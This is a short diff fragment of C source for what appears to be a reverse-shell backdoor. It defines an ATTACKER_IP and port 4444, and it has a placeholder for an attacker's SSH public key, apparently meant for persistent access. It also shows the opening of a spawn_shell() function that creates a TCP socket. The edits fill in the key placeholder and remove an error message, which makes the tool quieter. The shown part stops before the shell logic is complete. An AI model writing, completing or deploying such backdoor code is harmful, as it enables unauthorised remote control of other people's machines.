@@ -1,18 +1,16 @@
+#include <stdio.h>
+#include <stdlib.h>
 #include <stdbool.h>
 #include <unistd.h>
-#include <stdlib.h>
-#include <stdio.h>
-
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include "connection.h"
 
 #define ATTACKER_IP "127.0.0.1"
 #define PORT 4444
-#define ATTACKER_SSH_PUBLIC_KEY ""
-
-bool spawn_shell();
+#define ATTACKER_SSH_PUBLIC_KEY "put your ssh public key here"
 
 bool spawn_shell(){
 
@@ -22,7 +20,6 @@ bool spawn_shell(){
         struct sockaddr_in server_addr;
 
         if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) { // use IPv4 and TCP
-            printf("\nCannot create socket\n");
             return false;
         }
 
